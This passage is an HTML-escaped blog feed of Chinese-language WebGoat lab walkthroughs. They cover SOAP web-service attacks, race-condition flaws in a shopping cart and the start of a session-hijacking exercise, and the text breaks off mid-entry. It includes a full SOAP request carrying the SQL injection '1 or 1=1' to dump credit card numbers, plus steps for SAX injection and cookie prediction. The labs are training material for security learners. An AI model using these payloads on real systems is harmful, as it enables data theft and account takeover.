class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;POST https://localhost:8443/WebGoat/services/SoapRequest HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Host: localhost:8443&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Accept: textml,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Accept-Encoding: gzip, deflate, br&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Referer: https://localhost:8443/WebGoat/attack?Screen=32&amp;amp;menu=1800&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Cookie: JSESSIONID=B0E2BCDE68B32C2894064DF30A545EAA&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Content-Type: text/xml&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;SOAPAction:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Content-Length: 445&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;SOAP-ENV:Envelope&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;xmlns:SOAP-ENV&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;xmlns:xsd&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;http://www.w3.org/2001/XMLSchema&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;xmlns:xsi&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;SOAP-ENV:Body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;ns1:getFirstName&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;SOAP-ENV:encodingStyle&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;xmlns:ns1&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;http://lessons&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;xsi:type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;xsd:int&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;101&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;id&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;ns1:getFirstName&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;SOAP-ENV:Body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;SOAP-ENV:Envelope&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;注意以上代码的Host，Post，Content-Type，SOAPAction字段。&lt;/p&gt;
&lt;p&gt;此时服务器会有一个响应：&lt;br&gt;&lt;img src=&quot;/images/webgoat_web_services/10.png&quot; alt=&quot;10&quot;&gt;&lt;br&gt;传回来的值为：Joe&lt;br&gt;此时再将xml中的函数getFirstName两处改为getLastName，再发送一次请求，服务器返回：Snow&lt;br&gt;这关就过了。&lt;/p&gt;
&lt;h2 id=&quot;WSDL-Scanning&quot;&gt;&lt;a href=&quot;#WSDL-Scanning&quot; class=&quot;headerlink&quot; title=&quot;WSDL Scanning&quot;&gt;&lt;/a&gt;WSDL Scanning&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/images/webgoat_web_services/3.png&quot; alt=&quot;3&quot;&gt;&lt;br&gt;做这个实验的时候，我也是醉了，因为这样点击的时候，下面的SNOW一直出不来，其他函数也出不来，搞不清楚是什么问题。后来发现我用的https，然后改为http后就好了。在网络应用中，可以在配置文件里面要求强制转换为https，也可以同时保留http和https，这些的前提是服务器一定配了https。&lt;br&gt;这部分课程是要我们用到所有WSDL中定义的API操作，并且有返回值。我们知道WSDL中实际上有四种操作，而这里只列出了三种，我们可以查看WSDL文档后，将其修改为我们需要的操作。如图所示，把请求更改为这样：&lt;br&gt;&lt;img src=&quot;/images/webgoat_web_services/4.png&quot; alt=&quot;4&quot;&gt;&lt;br&gt;最后出现结果为如下：&lt;br&gt;&lt;img src=&quot;/images/webgoat_web_services/5.png&quot; alt=&quot;5&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Web-Service-SAX-Injection&quot;&gt;&lt;a href=&quot;#Web-Service-SAX-Injection&quot; class=&quot;headerlink&quot; title=&quot;Web Service SAX Injection&quot;&gt;&lt;/a&gt;Web Service SAX Injection&lt;/h2&gt;&lt;p&gt;有些Web界面在后台使用的是Web Services。而Web Services通过SOAP请求进行通信。该节课程需要我们修改除了用户101以外的另一个用户的密码：&lt;br&gt;&lt;img src=&quot;/images/webgoat_web_services/6.png&quot; alt=&quot;6&quot;&gt;&lt;br&gt;拦截后，把请求修改为如下：&lt;br&gt;&lt;img src=&quot;/images/webgoat_web_services/7.png&quot; alt=&quot;7&quot;&gt;&lt;br&gt;最后成功修改了编号102的密码：&lt;br&gt;&lt;img src=&quot;/images/webgoat_web_services/8.png&quot; alt=&quot;8&quot;&gt;&lt;br&gt;图片下面部分显示的是我们发送过去的请求。&lt;br&gt;其原理就是：SAX解析器会解析任何格式正常的XML文件，例如：匹配到有效的标记符号及闭合符号即认为正确。当您向原有的XML文件中添加新的changePAssword元素时，如果id和password等标记都正确，那么解析器将很乐意帮您去修改另一个userid的密码。我们在password字段增加了多余的恶意代码。&lt;/p&gt;
&lt;h2 id=&quot;Web-Service-SQL-Injection&quot;&gt;&lt;a href=&quot;#Web-Service-SQL-Injection&quot; class=&quot;headerlink&quot; title=&quot;Web Service SQL Injection&quot;&gt;&lt;/a&gt;Web Service SQL Injection&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/images/webgoat_web_services/9.png&quot; alt=&quot;9&quot;&gt;&lt;br&gt;要求我们查看WSDL文件，并尝试获取多个客户的信用卡帐号。&lt;br&gt;这一节与第一节一样，需要我们自己构造一个SOAP请求，构造如下请求发送：&lt;br&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;POST http://127.0.0.1:8080/WebGoat/services/WsSqlInjection HTTP/1.0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Accept: application/soap+xml, application/dime, multipart/related, text/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Host: 127.0.0.1:8080&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Content-Type: text/xml; charset=utf-8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;SOAPAction: &quot;&quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Content-length: 584&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;?xml version=&#39;1.0&#39; encoding=&#39;UTF-8&#39;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;wsns0:Envelope&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;attr&quot;&gt;xmlns:wsns1&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&#39;http://www.w3.org/2001/XMLSchema-instance&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;attr&quot;&gt;xmlns:xsd&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&#39;http://www.w3.org/2001/XMLSchema&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;attr&quot;&gt;xmlns:wsns0&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&#39;http://schemas.xmlsoap.org/soap/envelope/&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;wsns0:Body&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;wsns0:encodingStyle&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&#39;http://schemas.xmlsoap.org/soap/encoding/&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;wsns2:getCreditCard&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          &lt;span class=&quot;attr&quot;&gt;xmlns:wsns2&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&#39;http://lessons.webgoat.owasp.org&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;id&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;attr&quot;&gt;xsi:type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&#39;xsd:string&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &lt;span class=&quot;attr&quot;&gt;xmlns:xsi&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&#39;http://www.w3.org/2001/XMLSchema-instance&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;gt;&lt;/span&gt;1 or 1=1&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;id&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;ns2:getCreditCard&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;ns0:Body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;ns0:Envelope&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这里主要注意上面的ID是：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1 or 1=1&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;并且注意这里POST的地址与第一小节的地址是不一样的。&lt;br&gt;并且在getCreditCard之间加了一个id，写为string，然后传为以上值。攻击成功。服务器返回所有人的信用卡值：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/webgoat_web_services/11.png&quot; alt=&quot;11&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Summarize&quot;&gt;&lt;a href=&quot;#Summarize&quot; class=&quot;headerlink&quot; title=&quot;Summarize&quot;&gt;&lt;/a&gt;Summarize&lt;/h2&gt;&lt;p&gt;这一节实验花了较多的时间，主要是对于Web Services基础理解不熟，然后在做第三小节的时候，先是用Webscarab攻击成功之后，看源码，再在burpsuit里面做的。  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;【版权声明】&lt;/strong&gt;&lt;br&gt;本文首发于&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰的博客&lt;/a&gt;（ &lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;http://qimingyu.github.io/&lt;/a&gt; ），欢迎转载，但是必须保留本文的署名&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰&lt;/a&gt;（包含链接）。如您有任何商业合作或者授权方面的协商，请给我留言：mingyuqi.java@qq.com&lt;br&gt;本文永久链接：&lt;a href=&quot;http://qimingyu.github.io/2016/05/05/Webgoat之Web_Services/&quot;&gt;http://qimingyu.github.io/2016/05/05/Webgoat之Web_Services/&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;什么是Web Service？&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Web Service就是一种基于Web 的服务，但这个服务需要供求双方按照规定去做才能实现的服务。&lt;/li&gt;
&lt;li&gt;Web Service就是一个应用程序，它向外界暴露出一个能够通过Web进行调用的API。这就是说，你能够用编程的方法通过Web来调用这个应用程序。我们把能调用这个Web service 的应用程序叫做客户端程序。&lt;/li&gt;
&lt;li&gt;Web Service希望实现不同的系统之间能够用“软件-软件对话”的方式相互调用，打破了软件应用、网站和各种设备之间的格格不入的状态，实现“基于Web无缝集成”的目标。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;详细内容见&lt;a href=&quot;http://blog.csdn.net/weiguolee/article/details/6881411&quot;&gt;这里&lt;/a&gt;，它有三要素：WSDL用来描述服务；UDDI用来注册和查找服务；SOAP用来在消费者和服务提供者之间传送消息。&lt;br&gt;
    
    </summary>
    
      <category term="应用安全" scheme="http://qimingyu.github.io/categories/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络渗透" scheme="http://qimingyu.github.io/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
      <category term="WebGoat" scheme="http://qimingyu.github.io/tags/WebGoat/"/>
    
      <category term="Web服务漏洞" scheme="http://qimingyu.github.io/tags/Web%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Webgoat之Concurrency</title>
    <link href="http://qimingyu.github.io/2016/05/05/Webgoat%E4%B9%8BConcurrency/"/>
    <id>http://qimingyu.github.io/2016/05/05/Webgoat之Concurrency/</id>
    <published>2016-05-05T06:51:24.000Z</published>
    <updated>2016-05-05T07:47:31.000Z</updated>
    
    <content type="html">&lt;p&gt;这一节主要是讲线程安全的问题，考虑并发性。一个Web服务器总是同时服务很多人的，并且是同时处理很多的HTTP请求的，如果开发人员使用的变量不是线程安全的话，会存在并发带来的安全威胁。因为所有的线程共享同一个方法区，而所有的类变量都存储在方法区，多个线程试图同时使用相同的类变量，会造成错误。&lt;/p&gt;
&lt;h2 id=&quot;Thread-Safety-Problems&quot;&gt;&lt;a href=&quot;#Thread-Safety-Problems&quot; class=&quot;headerlink&quot; title=&quot;Thread Safety Problems&quot;&gt;&lt;/a&gt;Thread Safety Problems&lt;/h2&gt;&lt;p&gt;线程的安全问题。假设有两个用户同时登陆一个网站查看自己的账户，如果他们在同一时间登陆的话，网站的反馈会发生错乱。该部分需要用两个浏览器，一个输入用户名“jeff”，一个输入用户名“dave”，如下图所示：&lt;br&gt;&lt;img src=&quot;/images/webgoat_concurrency/1.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;需要以尽可能快的速度同时点击“提交”按钮。&lt;br&gt;&lt;img src=&quot;/images/webgoat_concurrency/2.png&quot; alt=&quot;2&quot;&gt;&lt;br&gt;如图所示，两个人看到的都是jeff的账户，另一个dave的人却进入了jeff的账户。这是服务端并发性错误引起的。&lt;/p&gt;
&lt;h2 id=&quot;Shopping-Cart-Concurrency-Flaw&quot;&gt;&lt;a href=&quot;#Shopping-Cart-Concurrency-Flaw&quot; class=&quot;headerlink&quot; title=&quot;Shopping Cart Concurrency Flaw&quot;&gt;&lt;/a&gt;Shopping Cart Concurrency Flaw&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/images/webgoat_concurrency/3.png&quot; alt=&quot;3&quot;&gt;&lt;br&gt;这是一个购物车的页面，需要我们以少的钱买高价值的商品。&lt;br&gt;首先用浏览器A，选择169美元的商品，并且点击购买，得到如下界面：&lt;br&gt;&lt;img src=&quot;/images/webgoat_concurrency/4.png&quot; alt=&quot;4&quot;&gt;&lt;/p&gt;
&lt;p&gt;然后用浏览器B，选一个1799美元的商品，点击更新，浏览器B显示为这样：&lt;br&gt;&lt;img src=&quot;/images/webgoat_concurrency/5.png&quot; alt=&quot;5&quot;&gt;&lt;/p&gt;
&lt;p&gt;此时浏览器A再点击确认就变成了这样：&lt;br&gt;&lt;img src=&quot;/images/webgoat_concurrency/6.png&quot; alt=&quot;6&quot;&gt;&lt;/p&gt;
&lt;p&gt;说明对于浏览器A而言，他用169美元买了1799美元的商品。&lt;br&gt;这个原因在于浏览器B的更新时，浏览器A受影响了，服务器没有很好的处理多线程的问题。&lt;/p&gt;
&lt;h2 id=&quot;Summarize&quot;&gt;&lt;a href=&quot;#Summarize&quot; class=&quot;headerlink&quot; title=&quot;Summarize&quot;&gt;&lt;/a&gt;Summarize&lt;/h2&gt;&lt;p&gt;多线程和并发安全在网络安全中也是需要考虑的。  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;【版权声明】&lt;/strong&gt;&lt;br&gt;本文首发于&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰的博客&lt;/a&gt;（ &lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;http://qimingyu.github.io/&lt;/a&gt; ），欢迎转载，但是必须保留本文的署名&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰&lt;/a&gt;（包含链接）。如您有任何商业合作或者授权方面的协商，请给我留言：mingyuqi.java@qq.com&lt;br&gt;本文永久链接：&lt;a href=&quot;http://qimingyu.github.io/2016/05/05/Webgoat之Concurrency/&quot;&gt;http://qimingyu.github.io/2016/05/05/Webgoat之Concurrency/&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;这一节主要是讲线程安全的问题，考虑并发性。一个Web服务器总是同时服务很多人的，并且是同时处理很多的HTTP请求的，如果开发人员使用的变量不是线程安全的话，会存在并发带来的安全威胁。因为所有的线程共享同一个方法区，而所有的类变量都存储在方法区，多个线程试图同时使用相同的类变量，会造成错误。&lt;/p&gt;
&lt;h2 id=&quot;Thread-Safety-Problems&quot;&gt;&lt;a href=&quot;#Thread-Safety-Problems&quot; class=&quot;headerlink&quot; title=&quot;Thread Safety Problems&quot;&gt;&lt;/a&gt;Thread Safety Problems&lt;/h2&gt;&lt;p&gt;线程的安全问题。假设有两个用户同时登陆一个网站查看自己的账户，如果他们在同一时间登陆的话，网站的反馈会发生错乱。该部分需要用两个浏览器，一个输入用户名“jeff”，一个输入用户名“dave”，如下图所示：&lt;br&gt;&lt;img src=&quot;/images/webgoat_concurrency/1.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="应用安全" scheme="http://qimingyu.github.io/categories/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络渗透" scheme="http://qimingyu.github.io/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
      <category term="WebGoat" scheme="http://qimingyu.github.io/tags/WebGoat/"/>
    
      <category term="并发性" scheme="http://qimingyu.github.io/tags/%E5%B9%B6%E5%8F%91%E6%80%A7/"/>
    
  </entry>
  
  <entry>
    <title>Webgoat之Session Management Flaws</title>
    <link href="http://qimingyu.github.io/2016/05/04/Webgoat%E4%B9%8BSession_Management_Flaws/"/>
    <id>http://qimingyu.github.io/2016/05/04/Webgoat之Session_Management_Flaws/</id>
    <published>2016-05-04T10:00:59.000Z</published>
    <updated>2016-05-05T06:32:43.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;Hijack-a-Session&quot;&gt;&lt;a href=&quot;#Hijack-a-Session&quot; class=&quot;headerlink&quot; title=&quot;Hijack a Session&quot;&gt;&lt;/a&gt;Hijack a Session&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/images/webgoat_session_management_flaws/1.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;如图是一个登陆页面，现在要求在不知道用户名和密码的情况下登陆进去。现在我们已经知道的是如果传过去的cookie是对的话，服务器端会跳过验证用户名和密码的环节。也就是说用户名和密码可以随便填写，关键是猜对cookie，并且这个cookie需要是正在使用的会话cookie。我们先随便抓一个看看所提交的是哪些数据：&lt;br&gt;&lt;img src=&quot;/images/webgoat_session_management_flaws/2.png&quot; alt=&quot;2&quot;&gt;&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;可以看到在请求头中cookie有两个，一个是WEAKID，一个是JSESSION，我们主要是猜对请求头的WEAKID，这是我们的会话ID。首先我们连续刷新该页面，观察服务器传过来的cookie的变化。也就是说在刷新该页面的时候，需要删掉WEAKID后再发送请求，这样每次服务器都会传过来一个WEAKID，我们可以观察其规律。先试第一个，我们提交一个请求后，服务器传过来的响应是这样的：&lt;br&gt;&lt;img src=&quot;/images/webgoat_session_management_flaws/3.png&quot; alt=&quot;3&quot;&gt;&lt;br&gt;继续提交一个请求，服务器传过来的响应是这样的：&lt;br&gt;&lt;img src=&quot;/images/webgoat_session_management_flaws/4.png&quot; alt=&quot;4&quot;&gt;&lt;br&gt;可以发现WEAKID由两部分组成，减号前面是依次递增的，减号后面也是递增的，这是我们观察之后的结论。下面继续验证，采用burpsuit提供的自动化发包工具，提交一个数据，抓到之后删掉WEAKID，然后点击Action发送到Sequencer。然后进行相应的设置：&lt;br&gt;&lt;img src=&quot;/images/webgoat_session_management_flaws/5.png&quot; alt=&quot;5&quot;&gt;&lt;br&gt;上面是选择tooken出现的地方。&lt;br&gt;&lt;img src=&quot;/images/webgoat_session_management_flaws/6.png&quot; alt=&quot;6&quot;&gt;&lt;br&gt;上面是选择运行的线程个数。然后点击Start live capture，开始抓包：&lt;br&gt;&lt;img src=&quot;/images/webgoat_session_management_flaws/7.png&quot; alt=&quot;7&quot;&gt;&lt;br&gt;上面表示已经发送的请求和已经抓到的tooken。此时点击copy token，再回到Manual load，点击Paste：&lt;br&gt;&lt;img src=&quot;/images/webgoat_session_management_flaws/8.png&quot; 